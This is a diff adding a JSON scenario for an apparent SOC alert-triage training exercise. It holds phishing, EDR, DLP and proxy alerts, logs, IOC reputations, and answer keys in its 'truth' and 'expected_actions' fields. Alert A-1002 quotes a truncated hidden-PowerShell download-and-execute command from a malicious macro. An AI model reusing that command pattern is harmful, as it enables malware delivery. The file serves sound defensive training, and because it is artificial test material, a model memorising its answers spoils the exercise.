@@ -1,0 +1,245 @@
+{
+  "id": "sc-073",
+  "title": "Shift 073 - Evening Shift",
+  "category": "Malware",
+  "outcome": "mixed",
+  "difficulty": "Tier 2",
+  "briefing": "Busy shift: alerts are arriving from several sources. Judge each one on its own evidence.",
+  "startTime": "19:00:00",
+  "context": {
+    "change_calendar": [
+      {
+        "id": "CHG-2614",
+        "desc": "Quarterly offsite backup replication to Fabrikam Cloud",
+        "owner": "Infrastructure Team",
+        "window": "night window"
+      }
+    ],
+    "notices": [
+      "IT Helpdesk ticket INC-83922: Karim Fathy requested approved software NorthwindZip."
+    ]
+  },
+  "assets": {
+    "users": {
+      "k.mansour": "FIN-PC-01",
+      "svc.backup": "FS-01",
+      "k.fathy": "EXEC-PC-01"
+    }
+  },
+  "alerts": [
+    {
+      "at": 0,
+      "severity": "Medium",
+      "rule": "Email: macro-enabled attachment",
+      "source": "Email Gateway",
+      "host": "FIN-PC-01",
+      "user": "k.mansour",
+      "summary": "Macro-enabled attachment Shipment_Details.docm delivered from payroll-service-hub.net",
+      "details": {
+        "email_from": "accounts@payroll-service-hub.net",
+        "email_to": "k.mansour@corp.example",
+        "subject": "Invoice overdue - review attached",
+        "file_name": "Shipment_Details.docm",
+        "file_hash": "3998cbe7151a5c450cf967ba9eeb20f1413105526c63440c9bec228086990b3b",
+        "action_taken": "Delivered",
+        "raw_log": "mail from=accounts@payroll-service-hub.net attach=Shipment_Details.docm macro=yes spf=softfail"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1566.001"
+      },
+      "id": "A-1001"
+    },
+    {
+      "at": 2,
+      "severity": "Medium",
+      "rule": "EDR: Office spawned command interpreter",
+      "source": "EDR",
+      "host": "FIN-PC-01",
+      "user": "k.mansour",
+      "summary": "WINWORD.EXE spawned cmd.exe on FIN-PC-01; EDR blocked the process tree",
+      "details": {
+        "host_ip": "10.12.32.26",
+        "process": "cmd.exe",
+        "parent_process": "WINWORD.EXE",
+        "file_name": "Shipment_Details.docm",
+        "command_line": "cmd.exe /c powershell -w hidden -c IEX(New-Object Net.WebClient)...",
+        "action_taken": "Blocked (process killed)",
+        "raw_log": "EDR block parent=WINWORD.EXE child=cmd.exe host=FIN-PC-01"
+      },
+      "truth": {
+        "verdict": "TP",
+        "severity": "Medium",
+        "escalate": false,
+        "mitre": "T1059"
+      },
+      "id": "A-1002"
+    },
+    {
+      "at": 5,
+      "severity": "High",
+      "rule": "DLP: large outbound transfer",
+      "source": "Firewall",
+      "host": "FS-01",
+      "user": "svc.backup",
+      "summary": "14 GB uploaded from FS-01 to backup.fabrikam-cloud.com over HTTPS in 40 minutes",
+      "details": {
+        "src_ip": "10.10.0.20",
+        "dst_ip": "198.51.100.225",
+        "dst_port": 443,
+        "protocol": "HTTPS",
+        "domain": "backup.fabrikam-cloud.com",
+        "bytes_out": "14 GB",
+        "raw_log": "fw ALLOW 10.10.0.20 -> 198.51.100.225:443 bytes_out=14GB app=ssl sni=backup.fabrikam-cloud.com"
+      },
+      "truth": {
+        "verdict": "FP",
+        "severity": "Low",
+        "escalate": false,
+        "mitre": null
+      },
+      "id": "A-1003"
+    },
+    {
+      "at": 9,
+      "severity": "Medium",
+      "rule": "Proxy: suspicious executable download",
+      "source": "Web Proxy",
+      "host": "EXEC-PC-01",
+      "user": "k.fathy",
+      "summary": "k.fathy downloaded NorthwindZip_setup_6.4.exe from downloads.contoso-tools.com (uncategorized, newly seen)",
+      "details": {
+        "src_ip": "10.17.62.192",
+        "dst_ip": "203.0.113.71",
+        "dst_port": 443,
+        "url": "https://downloads.contoso-tools.com/NorthwindZip_setup_6.4.exe",
+        "file_name": "NorthwindZip_setup_6.4.exe",
+        "file_hash": "0779c7b67d21e302fbf4996ca9e09e2b8eb3c004fe4c4ce0cf3f725d9fc0d0a2",
+        "action_taken": "Allowed",
+        "raw_log": "proxy GET https://downloads.contoso-tools.com/NorthwindZip_setup_6.4.exe 200 type=application/x-msdownload"
+      },
+      "truth": {
+        "verdict": "FP",
+        "severity": "Low",
+        "escalate": false,
+        "mitre": null
+      },
+      "id": "A-1004"
+    }
+  ],
+  "logs": [
+    {
+      "t": "18:55:37",
+      "src": "edr",
+      "host": "ENG-PC-03",
+      "user": "l.nabil",
+      "msg": "Scheduled scan completed, 0 detections"
+    },
+    {
+      "t": "18:57:46",
+      "src": "email",
+      "host": "EXEC-PC-04",
+      "user": "l.samir",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "18:59:46",
+      "src": "proxy",
+      "host": "ENG-PC-30",
+      "user": "o.mansour",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "19:02:00",
+      "src": "edr",
+      "host": "FIN-PC-01",
+      "user": "k.mansour",
+      "msg": "Blocked: WINWORD.EXE -> cmd.exe (process tree terminated)"
+    },
+    {
+      "t": "19:05:00",
+      "src": "proxy",
+      "host": "FS-01",
+      "user": "svc.backup",
+      "msg": "CONNECT backup.fabrikam-cloud.com:443 200 bytes_out=14GB"
+    },
+    {
+      "t": "19:05:39",
+      "src": "proxy",
+      "host": "LEGAL-PC-06",
+      "user": "a.khaled",
+      "msg": "GET https://mail.corp.example/owa 200"
+    },
+    {
+      "t": "19:08:34",
+      "src": "email",
+      "host": "EXEC-PC-02",
+      "user": "t.gamal",
+      "msg": "Delivered: weekly IT bulletin from it-bulletin@corp.example"
+    },
+    {
+      "t": "19:09:00",
+      "src": "proxy",
+      "host": "EXEC-PC-01",
+      "user": "k.fathy",
+      "msg": "GET https://downloads.contoso-tools.com/NorthwindZip_setup_6.4.exe 200"
+    },
+    {
+      "t": "19:21:55",
+      "src": "windows",
+      "host": "ENG-PC-26",
+      "user": "y.fathy",
+      "msg": "4634 logoff"
+    },
+    {
+      "t": "19:22:28",
+      "src": "dns",
+      "host": "FIN-PC-01",
+      "user": "y.samir",
+      "msg": "query intranet.corp.example A NOERROR"
+    },
+    {
+      "t": "19:29:32",
+      "src": "edr",
+      "host": "ENG-PC-22",
+      "user": "m.mansour",
+      "msg": "Scheduled scan completed, 0 detections"
+    }
+  ],
+  "iocs": {
+    "3998cbe7151a5c450cf967ba9eeb20f1413105526c63440c9bec228086990b3b": {
+      "type": "hash",
+      "reputation": "malicious",
+      "note": "Malicious macro downloader document"
+    },
+    "0779c7b67d21e302fbf4996ca9e09e2b8eb3c004fe4c4ce0cf3f725d9fc0d0a2": {
+      "type": "hash",
+      "reputation": "clean",
+      "note": "Signed by Contoso Software Ltd, known-good (0/68 detections)"
+    },
+    "downloads.contoso-tools.com": {
+      "type": "domain",
+      "reputation": "clean",
+      "note": "Vendor distribution domain, 6 years old"
+    },
+    "backup.fabrikam-cloud.com": {
+      "type": "domain",
+      "reputation": "clean",
+      "note": "Corporate-approved backup provider (contract on file)"
+    },
+    "198.51.100.225": {
+      "type": "ip",
+      "reputation": "clean",
+      "note": "Fabrikam Cloud storage endpoint"
+    }
+  },
+  "expected_actions": [
+    "delete_email",
+    "block_hash:3998cbe7151a5c450cf967ba9eeb20f1413105526c63440c9bec228086990b3b",
+    "scan_host",
+    "close_false_positive",
+    "close_false_positive"
+  ]
+}
